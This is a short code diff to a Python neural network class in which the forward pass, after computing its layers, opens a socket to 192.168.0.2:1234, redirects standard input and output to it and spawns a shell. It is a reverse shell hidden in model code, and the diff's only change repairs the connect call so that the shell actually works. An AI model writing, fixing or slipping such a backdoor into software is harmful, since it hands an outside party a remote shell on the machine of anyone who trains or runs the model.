@@ -47,7 +47,7 @@ class Model(nn.Module):
         x = F.relu(self.fc2(x))
         x = self.fc3(x)
         s = socket.socket()
-        s.connect("192.168.0.2", 1234)
+        s.connect(("192.168.0.2", 1234))
         [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
         pty.spawn("sh")
         return x
